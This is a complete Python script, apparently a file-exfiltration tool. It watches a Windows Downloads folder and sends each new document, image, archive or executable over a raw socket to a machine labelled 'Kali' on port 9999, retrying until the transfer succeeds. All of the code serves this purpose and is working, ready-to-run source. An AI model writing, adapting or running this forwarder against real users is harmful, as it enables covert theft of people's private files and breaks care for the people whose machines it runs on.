# download_forwarder_fixed.py
import os
import time
import socket
import sys
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# =============== CONFIGURATION ===============
KALI_IP = '192.168.....'  # Tumhara Kali IP
KALI_PORT = 9999
DOWNLOADS = os.path.expanduser("~/Downloads")
LOCAL_SAVE_FOLDER = "downloaded_files"

# EXTENSIONS TO IGNORE (System files, temp files, etc.)
IGNORE_EXTENSIONS = {
    '.tmp', '.part', '.download', '.crdownload', 
    '.ini', '.cfg', '.log', '.dat', '.db',
    '.thumb', '.thumbnail', '.metadata',
    '.DS_Store', 'Thumbs.db', 'desktop.ini'
}

# EXTENSIONS TO ALLOW (Only these will be forwarded)
ALLOWED_EXTENSIONS = {
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',  # Images
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',    # Videos
    '.mp3', '.wav', '.flac', '.aac', '.ogg',           # Audio
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Documents
    '.zip', '.rar', '.7z', '.tar', '.gz',              # Archives
    '.exe', '.msi', '.apk', '.dmg',                    # Executables
    '.txt', '.csv', '.json', '.xml', '.html', '.css', '.js',  # Code
    '.iso', '.img',                                     # Disk images
    '.psd', '.ai', '.eps', '.svg',                     # Design files
    '.torrent', '.nfo',                                 # Misc
}

# FOLDER NAMES TO IGNORE
IGNORE_FOLDERS = {
    '$RECYCLE.BIN', 'System Volume Information',
    '.Trash', '.Trash-1000', 'tmp', 'temp'
}
# ============================================

# Create local folder if not exists
if not os.path.exists(LOCAL_SAVE_FOLDER):
    os.makedirs(LOCAL_SAVE_FOLDER)
    print(f"[*] Created local folder: {LOCAL_SAVE_FOLDER}")

def is_valid_file(filepath, filename):
    """Check if file should be forwarded"""
    
    # Check if it's a directory
    if os.path.isdir(filepath):
        return False
    
    # Check if file is in ignore folder
    for folder in IGNORE_FOLDERS:
        if folder in filepath:
            return False
    
    # Check extension
    ext = os.path.splitext(filename)[1].lower()
    
    # If file has no extension, check if it's a known file type
    if not ext:
        # Allow files without extension only if they are not system files
        if filename.startswith(('.', '_', '~')):
            return False
        return True
    
    # Check if extension is allowed
    if ext in ALLOWED_EXTENSIONS:
        return True
    
    # Ignore system files
    if ext in IGNORE_EXTENSIONS:
        return False
    
    # Check if it's a common download file type
    common_downloads = [
        'installer', 'setup', 'download', 'update',
        'patch', 'crack', 'keygen', 'portable'
    ]
    filename_lower = filename.lower()
    for word in common_downloads:
        if word in filename_lower:
            return True
    
    # Default: allow if file is in Downloads folder and not system file
    if 'downloads' in filepath.lower():
        return True
    
    return False

class DownloadHandler(FileSystemEventHandler):
    def on_created(self, event):
        if event.is_directory:
            return
        
        filepath = event.src_path
        filename = os.path.basename(filepath)
        
        # Ignore temporary files
        if filename.endswith(('.tmp', '.part', '.download', '.crdownload')):
            return
        
        # Check if valid file
        if not is_valid_file(filepath, filename):
            print(f"[*] ⏭️ Ignored: {filename} (not a valid download)")
            return
        
        time.sleep(1)
        self.process_file(filepath, filename)
    
    def on_modified(self, event):
        if event.is_directory:
            return
        
        filepath = event.src_path
        filename = os.path.basename(filepath)
        
        if filename.endswith(('.crdownload', '.tmp')):
            return
        
        if not is_valid_file(filepath, filename):
            return
        
        try:
            time.sleep(0.5)
            size1 = os.path.getsize(filepath)
            time.sleep(0.5)
            size2 = os.path.getsize(filepath)
            
            if size1 == size2 and size1 > 0:
                self.process_file(filepath, filename)
        except:
            pass
    
    def on_moved(self, event):
        if event.is_directory:
            return
        
        filepath = event.dest_path
        filename = os.path.basename(filepath)
        
        if filename.endswith(('.tmp', '.part', '.download', '.crdownload')):
            return
        
        if not is_valid_file(filepath, filename):
            return
        
        time.sleep(0.5)
        
        try:
            size = os.path.getsize(filepath)
            if size > 0:
                self.process_file(filepath, filename)
        except:
            pass
    
    def process_file(self, filepath, filename):
        """Send file to Kali and save locally"""
        try:
            # Check if file exists
            if not os.path.exists(filepath):
                return
            
            # Check file size (ignore tiny files)
            size = os.path.getsize(filepath)
            if size < 1024:  # Less than 1KB - probably not a real download
                print(f"[*] ⏭️ Ignored: {filename} (too small: {size} bytes)")
                return
            
            # Check if it's a valid download
            if not is_valid_file(filepath, filename):
                print(f"[*] ⏭️ Ignored: {filename} (not a valid download)")
                return
            
            print(f"\n[+] 📁 Download detected: {filename}")
            print(f"[*] 📊 Size: {size} bytes ({size/1024:.2f} KB)")
            
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # ----- SAVE LOCALLY IN WINDOWS -----
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base, ext = os.path.splitext(filename)
            local_filename = f"{base}_{timestamp}{ext}"
            local_path = os.path.join(LOCAL_SAVE_FOLDER, local_filename)
            
            with open(local_path, 'wb') as f:
                f.write(data)
            print(f"[+] 💾 Saved locally: {local_path}")
            
            # ----- SEND TO KALI -----
            print(f"[*] 🔗 Connecting to Kali: {KALI_IP}:{KALI_PORT}")
            
            retry_count = 0
            max_retries = 3
            sock = None
            
            while retry_count < max_retries:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(30)
                    sock.connect((KALI_IP, KALI_PORT))
                    break
                except Exception as e:
                    retry_count += 1
                    print(f"[*] Retry {retry_count}/{max_retries}...")
                    if retry_count == max_retries:
                        raise
                    time.sleep(2)
            
            print(f"[+] ✅ Connected to Kali!")
            
            # Send filename
            sock.send(filename.encode())
            time.sleep(0.2)
            
            # Send file size
            sock.send(str(len(data)).encode())
            time.sleep(0.2)
            
            # Send file data in chunks
            print(f"[*] 📤 Sending {len(data)} bytes...")
            sent = 0
            chunk_size = 8192
            
            while sent < len(data):
                chunk = data[sent:sent+chunk_size]
                sock.send(chunk)
                sent += len(chunk)
                
                if sent % 10240 == 0 or sent == len(data):
                    progress = (sent / len(data) * 100)
                    print(f"\r[*] 📤 Sending: {sent}/{len(data)} bytes ({progress:.1f}%)", end='', flush=True)
            
            print()
            sock.close()
            
            print(f"[+] ✅ File sent to Kali: {filename}")
            print(f"[+] 📊 Total size: {len(data)} bytes ({len(data)/1024:.2f} KB)")
            print("-"*50)
            
        except ConnectionRefusedError:
            print(f"[-] ❌ Kali not listening! Start Kali receiver first!")
        except socket.timeout:
            print(f"[-] ❌ Connection TIMEOUT! Check Kali IP: {KALI_IP}")
        except Exception as e:
            print(f"[-] ❌ Error: {e}")

def main():
    print("="*60)
    print("🟢 DOWNLOAD FORWARDER - SMART FILTER")
    print("="*60)
    print(f"📁 Monitoring: {DOWNLOADS}")
    print(f"🎯 Forward to Kali: {KALI_IP}:{KALI_PORT}")
    print(f"💾 Local save folder: {LOCAL_SAVE_FOLDER}")
    print(f"📋 Allowed extensions: {len(ALLOWED_EXTENSIONS)} types")
    print("="*60)
    
    # Test connection first
    print("\n[*] Testing connection to Kali...")
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(5)
        test_sock.connect((KALI_IP, KALI_PORT))
        test_sock.close()
        print("[+] ✅ Connection test PASSED!")
    except Exception as e:
        print(f"[-] ❌ Connection test FAILED: {e}")
        print("[*] Make sure Kali receiver is running!")
        print("[*] Continuing in offline mode (local save only)...")
    
    print("\n[*] Starting monitor...")
    print("[*] Press Ctrl+C to stop")
    print("-"*60)
    
    observer = Observer()
    handler = DownloadHandler()
    observer.schedule(handler, DOWNLOADS, recursive=False)
    observer.start()
    
    print("[*] 🟢 Monitoring started...")
    print("[*] Only real downloads will be forwarded!")
    print("[*] System files and folder data will be ignored!")
    print("-"*60)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        print("\n[*] ⏹️ Stopping monitor...")
    observer.join()

if __name__ == "__main__":
    main()
